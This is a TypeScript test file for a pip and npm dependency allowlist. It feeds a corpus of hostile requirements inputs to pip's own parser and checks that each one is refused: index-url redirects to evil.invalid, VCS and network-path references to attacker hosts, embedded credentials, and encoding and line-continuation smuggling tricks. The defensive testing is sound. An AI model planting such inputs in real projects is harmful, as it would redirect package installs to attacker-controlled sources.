/**
 * `deps/pipRequirements.ts` — the fail-closed allowlist create_fix_pr
 * refuses pip installs by, held to pip itself (review of 3.0, W2E).
 *
 * The first version matched pip's grammar with regular expressions and was
 * bypassed a dozen ways. So the corpus below — the reviewer's bypasses and
 * more — is parsed by pip's own `RequirementsFileParser` (and each
 * requirement by pip's own `parse_req_from_line`), and the test asserts:
 * for EVERY input where pip sees an index, find-links, a trusted host, an
 * editable requirement or a requirement with a link (URL, VCS, file path,
 * network path), dev-guardian refuses. The plain inputs — including what
 * `pip-compile --generate-hashes` writes — must NOT be refused, or the
 * allowlist would be useless.
 *
 * pip is found as `python -m pip` (`GUARDIAN_PYTHON` overrides); without a
 * pip ≥ 24 it is skipped, visibly. Measured on pip 26.2.1 / Python 3.14.
 */
import { spawnSync } from 'node:child_process';
import { mkdirSync, symlinkSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { afterAll, describe, expect, it } from 'vitest';
import { checkRequirements, describePipRefusal, urlHost } from '../../../src/deps/pipRequirements.js';
import { checkPyproject, checkSetupCfg } from '../../../src/deps/pythonProject.js';
import { installRefusal, npmSpecNetworkHost } from '../../../src/fixpr/repoPackageConfig.js';
import { cleanupTempDirs, makeTempDir } from '../../helpers/tempDir.js';

afterAll(cleanupTempDirs);

const PYTHON = process.env['GUARDIAN_PYTHON'] ?? (process.platform === 'win32' ? 'python' : 'python3');
const PIP_VERSION = ((): string | null => {
  const r = spawnSync(PYTHON, ['-c', 'import pip; print(pip.__version__)'], { encoding: 'utf8', timeout: 30_000 });
  const v = r.status === 0 ? r.stdout.trim() : '';
  return /^(2[4-9]|[3-9]\d)\./.test(v) ? v : null;
})();

const V = 'g' + 'it';
/** name → the requirements file's bytes (`extra.txt` is the include target the include cases name). */
const CORPUS: Record<string, Buffer> = {
  // --- the reviewer's bypasses of round 1
  abbr_index: Buffer.from('--index https://evil.invalid/simple\n'),
  abbr_extra: Buffer.from('--extra-index https://evil.invalid/simple\n'),
  abbr_find: Buffer.from('--find https://evil.invalid/links\n'),
  abbr_trusted: Buffer.from('--trusted evil.invalid\n'),
  abbr_edit: Buffer.from(`--edit ${V}+https://evil.invalid/r.git#egg=x\n`),
  e_concat: Buffer.from(`-e${V}+https://evil.invalid/r.git#egg=x\n`),
  e_quoted: Buffer.from(`-e "${V}+https://evil.invalid/r.git#egg=x"\n`),
  cr_only: Buffer.from('django==3.2.0\r--index-url https://evil.invalid/simple\n'),
  ff: Buffer.from('django==3.2.0\x0c--index-url https://evil.invalid/simple\n'),
  ls: Buffer.from('django==3.2.0 --index-url https://evil.invalid/simple\n', 'utf8'),
  ps: Buffer.from('django==3.2.0 --index-url https://evil.invalid/simple\n', 'utf8'),
  nel: Buffer.from('django==3.2.0\u0085--index-url https://evil.invalid/simple\n', 'utf8'),
  vt: Buffer.from('django==3.2.0\x0b--index-url https://evil.invalid/simple\n'),
  fs: Buffer.from('django==3.2.0\x1c--index-url https://evil.invalid/simple\n'),
  contin: Buffer.from('--ind\\\nex-url https://evil.invalid/simple\n'),
  contin_vcs: Buffer.from(`${V}\\\n+https://evil.invalid/r.git#egg=x\n`),
  unc_file: Buffer.from('pkg @ file://attacker.invalid/share/pkg-1.0.tar.gz\n'),
  unc_path: Buffer.from('\\\\attacker.invalid\\share\\pkg-1.0.tar.gz\n'),
  unc_fwd: Buffer.from('//attacker.invalid/share/pkg-1.0.tar.gz\n'),
  quoted_include: Buffer.from('-r "extra.txt"\n'),
  abbr_include: Buffer.from('--requirem extra.txt\n'),
  utf7: Buffer.from('# -*- coding: utf-7 -*-\n+AC0ALQ-index-url https://evil.invalid/simple\n'),
  utf16: Buffer.concat([Buffer.from([0xff, 0xfe]), Buffer.from('--index-url https://evil.invalid/simple\n', 'utf16le')]),
  env_in_opt: Buffer.from('-i https://evil.invalid/simple\n'),
  quoted_index: Buffer.from('"--index-url" https://evil.invalid/simple\n'),
  comment_bs: Buffer.from('# pinned by the platform team \\\n--index-url https://evil.invalid/simple\n'),
  trailing_opt_eq: Buffer.from('--index-url=https://evil.invalid/simple\n'),
  tab_e: Buffer.from(`-e\t${V}+https://evil.invalid/r.git#egg=x\n`),
  // --- more of the same, and of pip's other routes
  glued_i: Buffer.from('-ihttps://evil.invalid/simple\n'),
  glued_f: Buffer.from('-fhttps://evil.invalid/links\n'),
  no_index: Buffer.from('--no-index\n--find-links ./wheels\n'),
  direct: Buffer.from('pkg @ https://evil.invalid/pkg-1.0.tar.gz\n'),
  direct_creds: Buffer.from('pkg @ https://deploy:pa@ss-S3CRET@evil.invalid/p.tgz\n'),
  direct_vcs: Buffer.from(`pkg @ ${V}+ssh://git@evil.invalid/r.git@v1\n`),
  bare_url: Buffer.from('https://evil.invalid/pkg-1.0.tar.gz\n'),
  bare_vcs: Buffer.from(`${V}+https://evil.invalid/r.git#egg=pkg\n`),
  hg: Buffer.from('hg+https://evil.invalid/repo#egg=pkg\n'),
  svn: Buffer.from('svn+svn://evil.invalid/repo#egg=pkg\n'),
  bzr: Buffer.from('bzr+https://evil.invalid/repo#egg=pkg\n'),
  editable_local: Buffer.from('-e .\n'),
  local_archive: Buffer.from('./vendor/pkg-1.0.tar.gz\n'),
  file_url_local: Buffer.from('pkg @ file:///opt/wheels/pkg-1.0-py3-none-any.whl\n'),
  include_url: Buffer.from('-r https://evil.invalid/more.txt\n'),
  constraint_url: Buffer.from('-c https://evil.invalid/c.txt\n'),
  env_var_req: Buffer.from('pkg @ ${PKG_URL}\n'),
  include_then_index: Buffer.from('-r extra.txt\ndjango==3.2.0\n'),
  bom_utf8_index: Buffer.concat([Buffer.from([0xef, 0xbb, 0xbf]), Buffer.from('--index-url https://evil.invalid/simple\n')]),
  indent_index: Buffer.from('   --index-url https://evil.invalid/simple\n'),
  // --- plain inputs: must be installable
  plain: Buffer.from('django==3.2.0\nrequests>=2.28,<3\nflask[async]~=2.0 ; python_version >= "3.8"\n'),
  plain_hashes: Buffer.from(
    '#\n# This file is autogenerated by pip-compile\n#\n' +
      'django==4.2.1 \\\n    --hash=sha256:aaaa \\\n    --hash=sha256:bbbb\n    # via -r requirements.in\n' +
      'sqlparse==0.4.4 \\\n    --hash=sha256:cccc\n',
  ),
  plain_comments: Buffer.from('# a comment with https://example.invalid in it\nrequests==2.31.0  # pinned\n\n'),
  plain_include: Buffer.from('-r base.txt\n-c constraints.txt\n--require-hashes\n--only-binary :all:\n'),
  // Round 3 (b): a value glued to -r / -c is read as pip reads it, the included file checked like any other.
  plain_glued: Buffer.from('-rbase.txt\n-cconstraints.txt\n'),
  glued_include_index: Buffer.from('-rextra.txt\n'),
};
const INCLUDES: Record<string, string> = {
  'extra.txt': '--index-url https://evil.invalid/simple\n',
  'base.txt': 'django==3.2.0\n',
  'constraints.txt': 'django<4\n',
};
const PLAIN = new Set(['plain', 'plain_hashes', 'plain_comments', 'plain_include', 'plain_glued']);

/** One directory per case, so a relative include resolves as pip resolves it. */
function corpusDir(): string {
  const root = makeTempDir('pip-allowlist-');
  for (const [name, bytes] of Object.entries(CORPUS)) {
    mkdirSync(join(root, name));
    writeFileSync(join(root, name, 'requirements.txt'), bytes);
    for (const [inc, text] of Object.entries(INCLUDES)) writeFileSync(join(root, name, inc), text);
  }
  return root;
}

/** pip's own view of each case: the source-choosing options it set, and each requirement's link scheme. */
const PIP_PROGRAM = `
import json, os, sys
from pip._internal.network.session import PipSession
from pip._internal.req.req_file import RequirementsFileParser, get_line_parser
from pip._internal.req.constructors import parse_req_from_line
root = sys.argv[1]
out = {}
for name in sorted(os.listdir(root)):
    d = os.path.join(root, name)
    info = {'sources': [], 'error': None}
    os.chdir(d)
    try:
        for pl in RequirementsFileParser(PipSession(), get_line_parser(None)).parse(os.path.join(d, 'requirements.txt'), constraint=False):
            o = pl.opts
            for k in ('index_url', 'extra_index_urls', 'no_index', 'find_links', 'trusted_hosts'):
                if getattr(o, k, None):
                    info['sources'].append(k)
            if pl.is_editable:
                info['sources'].append('editable')
            elif pl.requirement:
                try:
                    parts = parse_req_from_line(pl.requirement, None)
                    if parts.link is not None:
                        info['sources'].append('link:' + parts.link.scheme)
                    elif parts.requirement is not None and parts.requirement.url:
                        info['sources'].append('url:' + parts.requirement.url.split(':', 1)[0])
                except Exception as e:
                    info['sources'].append('unparsable-requirement')
    except Exception as e:
        info['error'] = type(e).__name__
    out[name] = info
print(json.dumps(out))
`;

describe.skipIf(PIP_VERSION === null)(`the allowlist against pip ${PIP_VERSION ?? '(not found)'}'s own parser`, () => {
  const root = corpusDir();
  const r = spawnSync(PYTHON, ['-c', PIP_PROGRAM, root], { encoding: 'utf8', timeout: 120_000 });
  const pip = JSON.parse(r.status === 0 ? r.stdout : '{}') as Record<string, { sources: string[]; error: string | null }>;

  it('pip parsed the corpus', () => {
    expect(r.status, r.stderr).toBe(0);
    expect(Object.keys(pip).sort()).toEqual(Object.keys(CORPUS).sort());
  });

  /** pip chose a source: an option, an editable, a link or URL — or it went to the network to read an include. */
  const pipChoosesSource = (name: string): boolean => {
    const seen = pip[name];
    return seen !== undefined && (seen.error === 'ConnectionFailedError' || seen.sources.some((x) => x !== 'unparsable-requirement'));
  };

  it('pip itself chooses a source in every non-plain case but one', () => {
    // `"--index-url" https://…` is a requirement to pip, and not a valid one: dev-guardian refuses it as not plain.
    expect(Object.keys(CORPUS).filter((n) => !PLAIN.has(n) && !pipChoosesSource(n))).toEqual(['quoted_index']);
  });

  it.each(Object.keys(CORPUS).filter((n) => !PLAIN.has(n)))('%s: dev-guardian refuses', (name) => {
    const dg = checkRequirements(join(root, name), ['requirements.txt'], join(root, name));
    expect(dg.refusals.length, JSON.stringify({ pip: pip[name] })).toBeGreaterThan(0);
    // Never with the text of a credential.
    expect(JSON.stringify(dg.refusals)).not.toMatch(/S3CRET|deploy:|pa@ss/);
  });

  it.each([...PLAIN])('%s: pip sees no source, and dev-guardian admits it', (name) => {
    expect(pip[name]?.sources ?? ['(missing)']).toEqual([]);
    expect(checkRequirements(join(root, name), ['requirements.txt'], join(root, name)).refusals).toEqual([]);
  });
});

describe('what a refusal says', () => {
  const one = (text: string | Buffer, extra: Record<string, string> = {}) => {
    const dir = makeTempDir('pip-refusal-');
    writeFileSync(join(dir, 'requirements.txt'), text);
    for (const [f, body] of Object.entries(extra)) writeFileSync(join(dir, f), body);
    return checkRequirements(dir, ['requirements.txt'], dir, { stopAtFirst: true }).refusals.map(describePipRefusal);
  };

  it.each([
    ['--index https://evil.invalid/simple', 'requirements.txt:1: index option (--index, https://evil.invalid)'],
    [`-e${V}+https://evil.invalid/r.git#egg=x`, 'requirements.txt:1: editable requirement (-e, git+https://evil.invalid)'],
    ['django==1\r--index-url https://evil.invalid/s', 'requirements.txt:1: unusual character (U+000D)'.replace('U+000D', 'U+000D')],
    ['pkg @ https://deploy:pa@ss-S3CRET@evil.invalid/p.tgz', 'requirements.txt:1: direct reference (https://evil.invalid)'],
    ['\\\\attacker.invalid\\share\\pkg.tar.gz', 'requirements.txt:1: network path (\\\\attacker.invalid)'],
    ['pkg @ file://attacker.invalid/share/p.tgz', 'requirements.txt:1: network path (file://attacker.invalid)'],
    ['-r https://tok3n@evil.invalid/r.txt', 'requirements.txt:1: include of a URL (https://evil.invalid)'],
    ['pkg @ ${URL}', 'requirements.txt:1: environment variable (pip substitutes ${…} from the environment)'],
    ['--ind\\\nex-url https://evil.invalid/s', 'requirements.txt:1: index option (--index-url, https://evil.invalid)'],
  ])('%s', (line, said) => {
    const got = one(`${line}\n`);
    // `\r` alone is a line break to pip and to this reader alike: the second line is the index option.
    if (line.includes('\r')) expect(got).toEqual(['requirements.txt:2: index option (--index-url, https://evil.invalid)']);
    else expect(got).toEqual([said]);
  });

  // M1: the host was cut at the first `@`, so `deploy:pa@ss-S3CRET@evil.invalid` printed `ss-S3CRET@evil.invalid`.
  it.each([
    'pkg @ https://deploy:pa@ss-S3CRET@evil.invalid/p.tgz',
    `${V}+https://oauth2:glpat-S3CRET@evil.invalid/r.git#egg=x`,
    'https://tok3n-S3CRET@evil.invalid/p.tgz',
    'pkg @ deploy:S3CRET@evil.invalid/p.tgz',
    '--index-url https://deploy:S3CRET@evil.invalid/simple',
    '-r https://deploy:S3CRET@evil.invalid/more.txt',
    '--trusted-host deploy:S3CRET@evil.invalid',
  ])('a credential is never repeated: %s', (line) => {
    const got = one(`${line}\n`);
    expect(got).toHaveLength(1);
    expect(got.join()).not.toMatch(/S3CRET|deploy|tok3n|oauth2|pa@ss/);
  });

  it('a UTF-7 declaration and a UTF-32 BOM are refused as encodings pip would read differently', () => {
    expect(one('# -*- coding: utf-7 -*-\n+AC0ALQ-index-url https://evil.invalid/simple\n')).toEqual([
      'requirements.txt: encoding (declared coding utf-7)',
    ]);
    expect(one(Buffer.from([0xff, 0xfe, 0, 0, 0x61, 0, 0, 0]))).toEqual(['requirements.txt: encoding (UTF-32)']);
  });

  it('a UTF-16 file is decoded as pip decodes it, and judged', () => {
    const utf16 = Buffer.concat([Buffer.from([0xff, 0xfe]), Buffer.from('django==3.2.0\n', 'utf16le')]);
    expect(one(utf16)).toEqual([]);
  });

  it('an include is charged to the line that includes it; one past the bound refuses as unchecked, never "clean"', () => {
    const dir = makeTempDir('pip-chain-');
    writeFileSync(join(dir, 'requirements.txt'), '-r r1.txt\n');
    for (let i = 1; i < 250; i++) writeFileSync(join(dir, `r${i}.txt`), `-r r${i + 1}.txt\n`);
    writeFileSync(join(dir, 'r250.txt'), '--index-url https://evil.invalid/simple\n');
    const got = checkRequirements(dir, ['requirements.txt'], dir).refusals.map(describePipRefusal);
    expect(got).toEqual(['r199.txt:1: too many files (r200.txt: more than 200 requirements files)']);
  });

  it('250 sibling includes — the reviewer\'s wide tree — refuse as unchecked past the bound', () => {
    const dir = makeTempDir('pip-wide-');
    writeFileSync(join(dir, 'requirements.txt'), Array.from({ length: 250 }, (_, i) => `-r r${i + 1}.txt\n`).join(''));
    for (let i = 1; i < 250; i++) writeFileSync(join(dir, `r${i}.txt`), '# empty\n');
    writeFileSync(join(dir, 'r250.txt'), '--index-url https://evil.invalid/simple\n');
    const got = checkRequirements(dir, ['requirements.txt'], dir).refusals.map((r) => r.kind);
    expect(got).toContain('too many files');
  });

  it.skipIf(process.platform === 'win32')('an include that is a FIFO or a link to /dev/zero is refused as unreadable, at once (POSIX)', () => {
    for (const make of [
      (p: string): void => {
        expect(spawnSync('mkfifo', [p]).status).toBe(0);
      },
      (p: string): void => symlinkSync('/dev/zero', p),
    ]) {
      const dir = makeTempDir('pip-hostile-');
      writeFileSync(join(dir, 'requirements.txt'), '-r more.txt\n');
      make(join(dir, 'more.txt'));
      const t0 = Date.now();
      const got = checkRequirements(dir, ['requirements.txt'], dir).refusals;
      expect(Date.now() - t0).toBeLessThan(3_000);
      expect(got.map((r) => r.kind)).toEqual(['unreadable']);
    }
  });

  // Round 3 (b): fail-closed costs pip does not share, measured with pip 26.2.1's parser — a glued short include and an
  // absolute path open the same file as `-r reqs/base.txt`; `-r reqs\base.txt` opens `reqsbase.txt`.
  it('a glued short include (-rreqs/base.txt, -creqs/base.txt) is followed, as pip follows it', () => {
    const dir = makeTempDir('pip-glued-');
    mkdirSync(join(dir, 'reqs'));
    writeFileSync(join(dir, 'reqs', 'base.txt'), '--index-url https://evil.invalid/simple\n');
    for (const line of ['-rreqs/base.txt', '-creqs/base.txt']) {
      writeFileSync(join(dir, 'requirements.txt'), `${line}\n`);
      expect(checkRequirements(dir, ['requirements.txt'], dir).refusals.map(describePipRefusal)).toEqual([
        'reqs/base.txt:1: index option (--index-url, https://evil.invalid)',
      ]);
    }
    writeFileSync(join(dir, 'reqs', 'base.txt'), 'django==4.2\n');
    expect(checkRequirements(dir, ['requirements.txt'], dir).refusals).toEqual([]);
  });

  it('an absolute include inside the checkout is followed; one outside it is refused', () => {
    const dir = makeTempDir('pip-abs-');
    mkdirSync(join(dir, 'reqs'));
    writeFileSync(join(dir, 'reqs', 'base.txt'), 'django==4.2\n');
    const inside = join(dir, 'reqs', 'base.txt').split('\\').join('/');
    writeFileSync(join(dir, 'requirements.txt'), `-r ${inside}\n`);
    expect(checkRequirements(dir, ['requirements.txt'], dir).refusals).toEqual([]);
    const outside = makeTempDir('pip-abs-out-');
    writeFileSync(join(outside, 'x.txt'), 'django==4.2\n');
    writeFileSync(join(dir, 'requirements.txt'), `-r ${join(outside, 'x.txt').split('\\').join('/')}\n`);
    expect(checkRequirements(dir, ['requirements.txt'], dir).refusals.map((r) => r.kind)).toEqual(['include out of the checkout']);
  });

  it('a backslash in an include is refused, saying pip opens a different file', () => {
    expect(one('-r reqs\\base.txt\n')).toEqual([
      'requirements.txt:1: quoted or escaped option (pip reads a backslash here as an escape, so the file it opens is not the one written)',
    ]);
  });

  it('an include out of the checkout, or through a link out of it, is refused', () => {
    const outside = makeTempDir('pip-out-');
    writeFileSync(join(outside, 'x.txt'), 'django==3.2.0\n');
    const dir = makeTempDir('pip-in-');
    mkdirSync(join(dir, 'svc'));
    writeFileSync(join(dir, 'svc', 'requirements.txt'), `-r ../../${outside.split(/[\\/]/).pop() ?? ''}/x.txt\n`);
    const got = checkRequirements(join(dir, 'svc'), ['requirements.txt'], dir).refusals;
    expect(got.map((r) => r.kind)).toEqual(['include out of the checkout']);
  });
});

describe('urlHost — scheme://host, never userinfo, port, path or query', () => {
  it.each([
    ['https://deploy:pa@ss-S3CRET@evil.invalid:8443/p.tgz?t=S3CRET', 'https://evil.invalid'],
    ['git+https://oauth2:glpat-S3CRET@evil.invalid/r.git', 'git+https://evil.invalid'],
    ['deploy:S3CRET@evil.invalid/p.tgz', '(no host)'],
    ['\\\\evil.invalid\\share\\x', '\\\\evil.invalid'],
    ['//evil.invalid/share/x', '\\\\evil.invalid'],
    ['not a url at all', '(unparseable URL)'],
  ])('%s → %s', (url, host) => {
    expect(urlHost(url)).toBe(host);
  });
});

describe('pyproject.toml and setup.cfg — the same rule', () => {
  const proj = (files: Record<string, string>): string => {
    const dir = makeTempDir('pyproj-');
    for (const [f, body] of Object.entries(files)) writeFileSync(join(dir, f), body);
    return dir;
  };
  const kinds = (dir: string, builds = true): string[] =>
    [...checkPyproject(dir, dir, builds), ...checkSetupCfg(dir, dir)].map(describePipRefusal);

  it('refuses a direct reference in [project].dependencies — the reviewer probe that pip-audit fetched from', () => {
    const dir = proj({ 'pyproject.toml': '[project]\nname = "x"\nversion = "0.1"\ndependencies = ["evilpkg @ http://127.0.0.1:9/evilpkg-1.0.tar.gz"]\n' });
    expect(kinds(dir)).toEqual(['pyproject.toml:4: direct reference (project.dependencies, http://127.0.0.1)']);
  });

  it('reads multi-line arrays, optional dependencies, dependency groups and build requirements', () => {
    const dir = proj({
      'pyproject.toml': [
        '[build-system]',
        'requires = ["setuptools>=61", "wheel"]',
        '[project]',
        'name = "x"',
        'dependencies = [',
        '  "django==4.2",  # web',
        `  'pkg @ ${V}+https://evil.invalid/r.git',`,
        ']',
        '[project.optional-dependencies]',
        'dev = ["pytest>=7", "local @ file:///src/local"]',
        '[dependency-groups]',
        'lint = ["ruff", { include-group = "dev" }]',
      ].join('\n'),
    });
    expect(kinds(dir)).toEqual([
      'pyproject.toml:5: VCS requirement (project.dependencies, git+https://evil.invalid)',
      'pyproject.toml:10: local path (project.optional-dependencies.dev, file:)',
    ]);
  });

  it.each([
    ['[tool.uv.sources]\nfoo = { git = "https://evil.invalid/r" }', 'pyproject.toml:4: source table ([tool.uv.sources])'],
    ['[[tool.uv.index]]\nurl = "https://evil.invalid/simple"', 'pyproject.toml:4: source table ([tool.uv.index])'],
    ['[tool.uv]\nindex-url = "https://evil.invalid/simple"', 'pyproject.toml:5: source table (tool.uv.index-url)'],
    ['[[tool.poetry.source]]\nname = "x"\nurl = "https://evil.invalid"', 'pyproject.toml:4: source table ([tool.poetry.source])'],
    ['[tool.poetry.dependencies]\nfoo = { git = "https://evil.invalid/r" }', 'pyproject.toml:5: source table (tool.poetry.dependencies.foo)'],
    ['[tool.pdm.source]\nurl = "https://evil.invalid"', 'pyproject.toml:4: source table ([tool.pdm.source])'],
    ['[tool.hatch.metadata]\nallow-direct-references = true', 'pyproject.toml:5: source table (tool.hatch.metadata.allow-direct-references)'],
  ])('refuses a tool source table: %s', (table, said) => {
    const dir = proj({ 'pyproject.toml': `[project]\nname = "x"\ndependencies = ["django"]\n${table}\n` });
    expect(kinds(dir)).toEqual([said]);
  });

  it('dependencies the build backend decides are refused only when pip-audit builds the project', () => {
    const dynamic = proj({ 'pyproject.toml': '[project]\nname = "x"\ndynamic = ["dependencies"]\n' });
    expect(kinds(dynamic, true)).toEqual(['pyproject.toml: dynamic dependencies ([project].dynamic)']);
    expect(kinds(dynamic, false)).toEqual([]);
    const toolOnly = proj({ 'pyproject.toml': '[tool.ruff]\nline-length = 100\n' });
    expect(kinds(toolOnly, true)).toEqual(['pyproject.toml: dynamic dependencies (no [project] table)']);
  });

  it('setup.cfg: dependency_links, and a URL among install_requires', () => {
    const dir = proj({
      'setup.cfg': '[options]\ninstall_requires =\n    requests>=2\n    evil @ https://evil.invalid/e.tgz\ndependency_links = https://evil.invalid/links\n',
    });
    expect(kinds(dir, false)).toEqual([
      'setup.cfg:4: direct reference (https://evil.invalid)',
      'setup.cfg:5: source table (dependency_links)',
    ]);
  });

  it('a plain project is admitted', () => {
    const dir = proj({
      'pyproject.toml': '[build-system]\nrequires = ["hatchling"]\n[project]\nname = "x"\ndependencies = ["django>=4,<5", "requests[socks]~=2.31"]\n[tool.ruff]\nline-length = 100\n',
    });
    expect(kinds(dir)).toEqual([]);
  });

  // The reviewer's probe: real pip-audit, re-scanning a pyproject-only project for create_fix_pr, fetched
  // `GET /evilpkg-1.0.tar.gz` from the host `[project].dependencies` named. pip-audit is not installed
  // on the machine this was written on, so the refusal is held here, at the decision create_fix_pr makes.
  it("create_fix_pr refuses any group deps_audit re-scans when pyproject.toml's dependencies name a URL", () => {
    const dir = proj({ 'pyproject.toml': '[project]\nname = "x"\nversion = "0.1"\ndependencies = ["evilpkg @ http://127.0.0.1:9/evilpkg-1.0.tar.gz"]\n' });
    expect(installRefusal({ projectDir: dir, stepEcosystems: ['npm'], stepFiles: [], rescanTools: ['deps_audit'] })).toBe(
      "the project's Python requirements name where pip installs from, or could not be checked " +
        '(pyproject.toml:4: direct reference (project.dependencies, http://127.0.0.1)); ' +
        'dev-guardian installs only plain requirements it has read — a name, extras, versions and markers',
    );
    expect(installRefusal({ projectDir: dir, stepEcosystems: ['npm'], stepFiles: [], rescanTools: ['scan_deps'] })).toBeNull();
  });
});

describe('npm specs that reach a network path', () => {
  it.each([
    ['file:\\\\evil.invalid\\share\\pkg', '\\\\evil.invalid'],
    ['file://evil.invalid/share/pkg', '\\\\evil.invalid'],
    ['file:////evil.invalid/share/pkg', '\\\\evil.invalid'],
    ['link://evil.invalid/share/pkg', '\\\\evil.invalid'],
    ['\\\\evil.invalid\\share\\pkg.tgz', '\\\\evil.invalid'],
    ['git+file://evil.invalid/share/repo.git', '\\\\evil.invalid'],
  ])('%s → %s', (spec, host) => {
    expect(npmSpecNetworkHost(spec)).toBe(host);
  });

  it.each(['1.2.3', '^1.0.0', 'file:../local', 'file:./vendor/pkg.tgz', 'file:///opt/pkg', 'link:../x', 'file://localhost/opt/pkg', 'npm:other@1'])(
    '%s is not a network path',
    (spec) => {
      expect(npmSpecNetworkHost(spec)).toBeNull();
    },
  );
});
